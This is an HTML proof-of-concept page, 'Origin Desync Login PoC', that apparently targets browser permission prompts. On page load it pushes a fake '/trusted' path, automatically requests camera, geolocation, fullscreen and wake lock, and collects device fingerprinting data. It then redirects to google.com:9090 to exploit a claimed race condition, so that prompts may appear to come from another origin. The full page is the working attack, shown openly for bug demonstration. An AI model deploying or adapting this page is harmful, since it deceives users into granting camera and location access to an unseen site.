<!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>Origin Desync Login PoC</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, system-ui;
      background: #f5f5f7;
    }

    #panel {
      max-width: 520px;
      margin: 60px auto;
      background: #fff;
      padding: 24px;
      border-radius: 16px;
      box-shadow: 0 20px 60px rgba(0, 0, 0, .2);
    }

    h2 {
      text-align: center;
      margin-bottom: 6px;
    }

    .sub {
      text-align: center;
      color: #666;
      margin-bottom: 20px;
    }

    .notice {
      margin-top: 14px;
      font-size: 13px;
      color: #b00020;
    }

    pre {
      margin-top: 12px;
      background: #111;
      color: #0f0;
      padding: 10px;
      font-size: 11px;
      max-height: 260px;
      overflow: auto;
    }
  </style>
</head>

<body>

  <div id="panel">
    <h2>Permissions and Device Info</h2>
    <div class="sub">Permissions are requested automatically...</div>
    <pre id="apiLog"></pre>
    <div class="notice">
      Demo only — browser permission required
    </div>
  </div>

  <script>
    const apiLog = document.getElementById('apiLog');
    const log = m => apiLog.textContent += m + "\n";
    const clearLog = () => apiLog.textContent = "";

    /* ====================== 
       API CALLS ON PAGE LOAD
    ======================= */
    window.addEventListener('load', async () => {
      log("=== API DEMO START ===");

      // Trigger history pushState for race condition
      history.pushState({}, '', '/trusted');

      // Automatically perform all API checks
      await checkPermissions();
      await getLocation();
      await openCamera();
      await checkBatteryStatus();
      await checkNetworkInfo();
      await checkDeviceMemory();
      await checkScreenResolution();
      await checkStorage();
      await checkIndexedDB();
      await checkWakeLock();
      await checkFullscreen();
      await triggerVibration();
      await checkVisibility();
      await checkOnlineStatus();
      await checkLanguage();
      await checkTimezone();
      await checkPerformance();
      await checkGamepad();
      await checkPointerTouch();
      await checkSpeechSynthesis();
      await checkSpeechRecognition();
      await checkDeviceMotionOrientation();

      log("=== API DEMO END ===");

      // Redirect to another origin (race condition)
      setTimeout(() => {
        location.href = 'https://google.com:9090';
      }, 100);
    });

    /* ====================== 
       API FUNCTIONS
    ======================= */
    async function checkPermissions() {
      log("=== Checking Permissions ===");
      if (navigator.permissions) {
        for (const p of ['geolocation', 'camera', 'microphone', 'notifications']) {
          try {
            const r = await navigator.permissions.query({ name: p });
            log(`Perm ${p}: ${r.state}`);
          } catch { log(`Perm ${p}: error`); }
        }
      }
    }

    async function getLocation() {
      log("=== Checking Geolocation ===");
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          p => log(`Geo: ${p.coords.latitude}, ${p.coords.longitude}`),
          () => log("Geo: permission denied")
        );
      } else {
        log("Geo: not supported");
      }
    }

    async function openCamera() {
      log("=== Opening Camera ===");
      try {
        await navigator.mediaDevices.getUserMedia({ video: true });
        log("Camera: allowed");
      } catch { log("Camera: denied"); }
    }

    async function checkBatteryStatus() {
      log("=== Checking Battery Status ===");
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        log(`Battery: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging ? 'Yes' : 'No'}`);
      } else {
        log("Battery: not supported");
      }
    }

    async function checkNetworkInfo() {
      log("=== Checking Network Info ===");
      if (navigator.connection) {
        log(`Network: ${navigator.connection.effectiveType}, Downlink: ${navigator.connection.downlink}Mb/s`);
      } else {
        log("Network: not supported");
      }
    }

    async function checkDeviceMemory() {
      log("=== Checking Device Memory ===");
      if ('deviceMemory' in navigator) {
        log(`Device Memory: ${navigator.deviceMemory} GB`);
      } else {
        log("Device Memory: not supported");
      }
    }

    async function checkScreenResolution() {
      log("=== Checking Screen Resolution ===");
      log(`Screen Resolution: ${screen.width}x${screen.height}`);
    }

    async function checkStorage() {
      log("=== Checking Storage ===");
      try {
        localStorage.setItem("test", "1");
        sessionStorage.setItem("test", "2");
        log("Storage: OK");
      } catch { log("Storage: blocked"); }
    }

    async function checkIndexedDB() {
      log("=== Checking IndexedDB ===");
      try {
        indexedDB.open("demo-db");
        log("IndexedDB: OK");
      } catch { log("IndexedDB: blocked"); }
    }

    async function checkWakeLock() {
      log("=== Checking WakeLock API ===");
      if ('wakeLock' in navigator) {
        try {
          await navigator.wakeLock.request('screen');
          log("WakeLock: acquired");
        } catch { log("WakeLock: denied"); }
      }
    }

    async function checkFullscreen() {
      log("=== Checking Fullscreen API ===");
      document.documentElement.requestFullscreen().then(
        () => log("Fullscreen: entered"),
        () => log("Fullscreen: denied")
      );
    }

    async function triggerVibration() {
      log("=== Triggering Vibration ===");
      navigator.vibrate?.(200);
      log("Vibration: triggered");
    }

    async function checkVisibility() {
      log("=== Checking Visibility API ===");
      log(`Visibility State: ${document.visibilityState}`);
    }

    async function checkOnlineStatus() {
      log("=== Checking Online Status ===");
      log(`Online: ${navigator.onLine}`);
    }

    async function checkLanguage() {
      log("=== Checking Language ===");
      log(`Language: ${navigator.language}`);
    }

    async function checkTimezone() {
      log("=== Checking Timezone ===");
      log(`Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}`);
    }

    async function checkPerformance() {
      log("=== Checking Performance ===");
      log(`Performance.now: ${performance.now()}`);
    }

    async function checkGamepad() {
      log("=== Checking Gamepad API ===");
      log(`Gamepads connected: ${navigator.getGamepads().length}`);
    }

    async function checkPointerTouch() {
      log("=== Checking Pointer/Touch Events ===");
      addEventListener('pointerdown', () => log("Pointer event triggered"), { once: true });
      addEventListener('touchstart', () => log("Touch event triggered"), { once: true });
    }

    async function checkSpeechSynthesis() {
      log("=== Checking Speech Synthesis ===");
      const utterance = new SpeechSynthesisUtterance("API demo");
      speechSynthesis.speak(utterance);
      log("Speech Synthesis: spoken");
    }

    async function checkSpeechRecognition() {
      log("=== Checking Speech Recognition ===");
      const SR = window.SpeechRecognition || window.webkitSpeechRecognition;
      log(`Speech Recognition: ${SR ? "supported" : "not supported"}`);
    }

    async function checkDeviceMotionOrientation() {
      log("=== Checking Device Motion / Orientation ===");
      addEventListener('deviceorientation', () => log("Orientation event triggered"), { once: true });
      addEventListener('devicemotion', () => log("Motion event triggered"), { once: true });
    }
  </script>

</body>
</html>
